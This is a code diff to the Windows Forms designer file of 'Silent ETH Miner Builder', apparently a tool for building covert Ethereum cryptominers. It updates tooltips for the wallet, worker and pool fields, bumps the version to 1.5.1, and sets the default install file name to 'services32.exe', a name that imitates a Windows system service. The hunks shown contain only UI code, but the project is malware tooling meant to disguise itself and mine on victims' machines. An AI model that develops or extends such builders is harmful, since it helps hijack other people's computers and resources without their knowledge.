@@ -152,7 +152,8 @@ Partial Class Form1
         Me.Label13.Size = New System.Drawing.Size(13, 13)
         Me.Label13.TabIndex = 48
         Me.Label13.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label13, resources.GetString("Label13.ToolTip"))
+        Me.TooltipHelper.SetToolTip(Me.Label13, "The worker name to mine with. You can also enter {%RANDOM%} to randomize a new nu" &
+        "mber every startup or enter {%COMPUTERNAME%} to get the computer name.")
         '
         'helpLabelPassword
         '
@@ -180,8 +181,7 @@ Partial Class Form1
         Me.Label10.TabIndex = 45
         Me.Label10.Text = "?"
         Me.TooltipHelper.SetToolTip(Me.Label10, "Extra data to send to the pool, separate the data with a '/' like so: data1/data2" &
-        "/data3. An example could be WorkerName/email%40test.com (%40 means @) on some po" &
-        "ols.")
+        "/data3. An example could be WorkerName/email@test.com on some pools.")
         '
         'helpLabelPool
         '
@@ -208,7 +208,9 @@ Partial Class Form1
         Me.helpLabelWallet.Size = New System.Drawing.Size(13, 13)
         Me.helpLabelWallet.TabIndex = 38
         Me.helpLabelWallet.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.helpLabelWallet, "The Ethereum wallet address to mine to. Some pools use a username instead.")
+        Me.TooltipHelper.SetToolTip(Me.helpLabelWallet, "The Ethereum wallet address to mine to. Required on most pools but for some pools" &
+        " that use a username or email you should leave this blank and enter the username" &
+        "/email into the 'Extra data' field.")
         '
         'Label4
         '
@@ -401,7 +403,7 @@ Partial Class Form1
         Me.MephForm1.Size = New System.Drawing.Size(535, 272)
         Me.MephForm1.SubHeader = "By Unam Sanctam, Credit to NYAN-x-CAT"
         Me.MephForm1.TabIndex = 0
-        Me.MephForm1.Text = "Silent ETH Miner Builder 1.5"
+        Me.MephForm1.Text = "Silent ETH Miner Builder 1.5.1"
         '
         'MephTabcontrol2
         '
@@ -696,7 +698,7 @@ Partial Class Form1
         Me.txtInstallFileName.Name = "txtInstallFileName"
         Me.txtInstallFileName.Size = New System.Drawing.Size(127, 24)
         Me.txtInstallFileName.TabIndex = 8
-        Me.txtInstallFileName.Text = "Services32.exe"
+        Me.txtInstallFileName.Text = "services32.exe"
         Me.txtInstallFileName.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
         Me.txtInstallFileName.UseSystemPasswordChar = False
         Me.txtInstallFileName.WordWrap = False
